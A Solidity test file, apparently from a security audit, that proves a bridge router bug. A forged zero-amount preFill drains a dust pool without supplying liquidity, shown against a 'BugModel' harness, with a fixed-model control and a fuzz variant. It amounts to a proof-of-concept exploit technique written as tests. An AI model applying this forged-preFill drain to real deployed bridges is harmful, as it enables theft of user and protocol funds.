// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    BridgeRouterPrefillDustBugModel,
    BridgeRouterPrefillDustFixedModel,
    DustReceiver,
    MockZeroAwareToken,
    TokenRegistryPrefillModel
} from "../src/BridgePrefillDustDrainHarness.sol";

contract BridgePrefillDustDrainTest {
    uint32 internal constant LOCAL_DOMAIN = 2000;
    uint32 internal constant ORIGIN_DOMAIN = 1000;

    function _assertTrue(bool _condition, string memory _message) internal pure {
        require(_condition, _message);
    }

    function _tokenId(address _token) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(_token)));
    }

    function _prefillId(
        uint32 _origin,
        uint32 _nonce,
        uint32 _tokenDomain,
        bytes32 _tokenIdBytes,
        address _recipient,
        uint256 _amount,
        bool _isFastTransfer
    ) internal pure returns (bytes32) {
        return
            keccak256(
                abi.encodePacked(
                    _origin,
                    _nonce,
                    _tokenDomain,
                    _tokenIdBytes,
                    _recipient,
                    _amount,
                    _isFastTransfer
                )
            );
    }

    /// @notice End-to-end witness:
    /// forged zero-amount preFill drains dust pool with no token liquidity provided.
    function test_forged_zero_prefill_drains_dust_without_liquidity() public {
        TokenRegistryPrefillModel registry = new TokenRegistryPrefillModel(
            LOCAL_DOMAIN
        );
        BridgeRouterPrefillDustBugModel router =
            new BridgeRouterPrefillDustBugModel(address(registry));
        MockZeroAwareToken token = new MockZeroAwareToken();

        router.seedDustPool(1 ether);
        DustReceiver recipient = new DustReceiver();

        bytes32 tokenId = _tokenId(address(token));
        bytes32 id = _prefillId(
            ORIGIN_DOMAIN,
            1,
            LOCAL_DOMAIN,
            tokenId,
            address(recipient),
            0,
            true
        );

        uint256 attackerBalBefore = token.balanceOf(address(this));
        uint256 recipientTokenBalBefore = token.balanceOf(address(recipient));
        uint256 dustPoolBefore = router.dustPoolWei();

        router.preFill(
            ORIGIN_DOMAIN, 1, LOCAL_DOMAIN, tokenId, address(recipient), 0, true
        );

        _assertTrue(
            router.liquidityProvider(id) == address(this),
            "LP should be recorded for forged id"
        );
        _assertTrue(
            router.dustedWei(address(recipient)) == router.DUST_AMOUNT(),
            "recipient should receive dust credit"
        );
        _assertTrue(
            router.dustPoolWei() + router.DUST_AMOUNT() == dustPoolBefore,
            "dust pool did not decrease"
        );
        _assertTrue(
            token.balanceOf(address(this)) == attackerBalBefore,
            "attacker token balance should not decrease"
        );
        _assertTrue(
            token.balanceOf(address(recipient)) == recipientTokenBalBefore,
            "recipient token balance should remain unchanged"
        );
    }

    /// @notice Fixed control: forged zero-amount preFill is rejected.
    function test_fixed_model_rejects_forged_zero_prefill() public {
        TokenRegistryPrefillModel registry = new TokenRegistryPrefillModel(
            LOCAL_DOMAIN
        );
        BridgeRouterPrefillDustFixedModel router =
            new BridgeRouterPrefillDustFixedModel(address(registry));
        MockZeroAwareToken token = new MockZeroAwareToken();

        router.seedDustPool(1 ether);
        DustReceiver recipient = new DustReceiver();
        uint256 dustPoolBefore = router.dustPoolWei();

        bool reverted;
        try
            router.preFill(
                ORIGIN_DOMAIN,
                1,
                LOCAL_DOMAIN,
                _tokenId(address(token)),
                address(recipient),
                0,
                true
            )
        {
            reverted = false;
        } catch {
            reverted = true;
        }

        _assertTrue(reverted, "fixed model should reject forged zero preFill");
        _assertTrue(
            router.dustedWei(address(recipient)) == 0,
            "fixed model should not dust recipient"
        );
        _assertTrue(
            router.dustPoolWei() == dustPoolBefore,
            "fixed model dust pool should not change"
        );
    }

    /// @notice Fuzz witness: nonce variation still allows dust drain from forged preFill.
    function testFuzz_bug_forged_prefill_drains_dust(uint32 nonceSeed) public {
        TokenRegistryPrefillModel registry = new TokenRegistryPrefillModel(
            LOCAL_DOMAIN
        );
        BridgeRouterPrefillDustBugModel router =
            new BridgeRouterPrefillDustBugModel(address(registry));
        MockZeroAwareToken token = new MockZeroAwareToken();

        router.seedDustPool(1 ether);
        DustReceiver recipient = new DustReceiver();

        router.preFill(
            ORIGIN_DOMAIN,
            nonceSeed,
            LOCAL_DOMAIN,
            _tokenId(address(token)),
            address(recipient),
            0,
            true
        );

        _assertTrue(
            router.dustedWei(address(recipient)) == router.DUST_AMOUNT(),
            "recipient should receive dust"
        );
        _assertTrue(
            router.dustPoolWei() == 1 ether - router.DUST_AMOUNT(),
            "dust pool delta mismatch"
        );
    }
}
